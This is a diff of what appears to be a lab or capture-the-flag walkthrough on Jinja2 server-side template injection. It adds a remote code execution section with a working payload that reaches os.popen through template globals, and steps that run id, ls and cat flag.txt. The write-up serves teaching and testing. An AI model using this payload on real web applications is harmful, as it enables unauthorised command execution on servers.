@@ -28,17 +28,35 @@ In your research, you've uncovered some basic examples of Jinja2 SSTI, including
 
 1. **Test Payload:** Jinja2 - Basic Injection Test.
 
-   ![Payload](/3.png)
+   ![Payload](/1.png)
 
    *Description: `{{7*7}}`*
 
 2. **Test Result:** The application responds with the output of the '{{7*7}}' command.
 
+   ![Result](/2.png)
+
+### SSTI Exploit for Remote Code Execution (RCE)
+
+After confirming the presence of SSTI in the web application, the next step is to exploit it for Remote Code Execution (RCE). One common payload for achieving RCE in Jinja2 is as follows:
+
+```jinja
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+1. **Test Payload:** Exploit the SSTI by calling os.popen().read().
+
+   ![Payload]!(/3.png)
+   
+3. **Test Result:** The application responds with the output of the 'id' command.
+
    ![Result](/4.png)
 
    *Description: Confirm that the application responds with the output of the 'id' command, indicating successful SSTI execution.*
 
-3. **Directory Listing**
+
+
+4. **Directory Listing**
    - **Payload:** Modify the payload to list the contents of the current directory using `ls`.
 
      ![Payload](/5.png)
@@ -47,7 +65,7 @@ In your research, you've uncovered some basic examples of Jinja2 SSTI, including
 
      ![Result](/6.png)
 
-4. **Read Flag Contents**
+5. **Read Flag Contents**
    - **Payload:** Modify the payload to cat the contents of `flag.txt`.
 
      ```jinja
